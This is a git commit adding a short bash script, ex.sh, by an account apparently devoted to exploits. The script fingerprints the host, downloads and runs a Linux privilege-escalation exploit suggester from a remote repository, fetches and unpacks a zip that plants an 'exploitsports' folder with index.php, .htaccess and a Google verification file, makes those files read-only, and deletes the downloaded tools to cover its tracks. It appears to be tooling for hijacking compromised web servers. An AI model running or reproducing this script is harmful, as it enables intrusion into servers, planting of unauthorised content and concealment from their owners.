cefc7c9fa7f236218da9e4ee243ea60be8f5509d
sniper404ghostxploit <115604134+sniper404ghostxploit@users.noreply.github.com>
2022-11-17 20:10:21 +0700

    Create ex.sh

---
+++ ex.sh
@@ -0,0 +1,14 @@
+#!/bin/bash
+cat /etc/os-release
+uname -a
+wget https://raw.githubusercontent.com/sniper404ghostxploit/LINUX-EXPLOIT-SUGESTER/master/linux-exploit-suggester.sh -O xploit.sh
+chmod +x xploit.sh
+./xploit.sh
+wget https://raw.githubusercontent.com/sniper404ghostxploit/var/main/x.zip
+unzip x.zip
+chmod 555 exploitsports/.htaccess
+chmod 555 exploitsports/index.php
+chmod 555 exploitsports/google919ca1aa9a28b4ac.html
+rm xploit.sh
+rm x.zip
+rm seo.sh
